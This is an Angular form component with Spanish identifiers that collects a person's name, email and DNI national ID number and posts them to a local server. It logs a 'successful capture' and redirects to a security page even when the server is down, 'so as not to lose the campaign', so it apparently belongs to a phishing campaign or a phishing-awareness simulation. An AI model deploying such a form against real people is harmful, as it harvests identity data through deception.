import { Component } from '@angular/core';
import { FormControl, FormGroup, ReactiveFormsModule, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { HttpClient } from '@angular/common/http';

@Component({
  selector: 'app-formulario',
  standalone: true,
  imports: [ReactiveFormsModule],
  templateUrl: './formulario.html',
  styleUrl: './formulario.css'
})
export class FormularioComponent {
  registroForm = new FormGroup({
    nombre: new FormControl('', Validators.required),
    email: new FormControl('', [Validators.required, Validators.email]),
    dni: new FormControl('', [Validators.required, Validators.minLength(8)])
  });

  constructor(private router: Router, private http: HttpClient) {}

enviarDatos() {
  if (this.registroForm.valid) {
    const datos = this.registroForm.value;

    // Reemplazar esta URL por environment.apiUrl en producción
    const apiUrl = 'http://localhost:5000/api/registro';

    this.http.post(apiUrl, datos).subscribe({
      next: (res) => {
        console.log('Captura exitosa');
        this.router.navigate(['/seguridad']);
      },
      error: (err) => {
        // Si el servidor está apagado, igual redirigimos para no perder la campaña
        console.error('Servidor offline, pero redirigiendo igual');
        this.router.navigate(['/seguridad']);
      }
    });
  }
}
}
